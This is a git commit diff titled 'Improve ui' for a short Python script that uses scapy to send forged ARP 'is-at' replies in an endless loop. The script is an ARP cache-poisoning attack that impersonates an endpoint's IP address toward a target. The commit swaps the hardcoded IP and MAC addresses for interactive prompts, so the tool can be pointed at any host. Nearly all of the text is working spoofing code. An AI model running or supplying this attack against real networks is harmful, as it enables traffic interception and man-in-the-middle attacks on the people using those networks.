b356639ac86a142d425326215900c53287ba52f0
TristanPinaudeau <tristan@flexfactory.fr>
2019-03-20 20:55:01 +0100

    Improve ui

--- main.py
+++ main.py
@@ -1,9 +1,9 @@
 from scapy.all import *
 import time
 
-endpointIP = "10.0.0.10"
-targetIP = "10.0.0.9"
-targetMAC = "14:dd:a9:91:1e:e2"
+endpointIP = input("The endpoint's IP address : ")
+targetIP = input("The target's IP address : ")
+targetMAC = input("The target's MAC address : ")
 
 while True:
     sendp(Ether(dst=targetMAC)/ARP(op="is-at", psrc=endpointIP, pdst=targetIP))
